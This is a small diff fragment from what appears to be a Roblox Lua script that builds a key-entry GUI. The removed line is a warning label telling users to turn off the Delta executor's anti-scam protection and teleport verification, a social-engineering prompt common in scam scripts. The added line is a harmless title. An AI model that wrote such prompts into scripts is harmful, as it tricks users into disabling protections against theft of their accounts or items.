@@ -33,7 +33,7 @@ Warning.Font = Enum.Font.SourceSans
 Warning.TextSize = 16
 Warning.TextColor3 = Color3.fromRGB(255,255,255)
 Warning.TextWrapped = true
-Warning.Text = "TURN OFF DELTA ANTI SCAM AND VERIFY TELEPORTS TO AVOID BUG'S"
+Warning.Text = "BEST COLLABORATION TEAM SCRIPT"
 Warning.Parent = KeyFrame
 
 local KeyBox = Instance.new("TextBox")
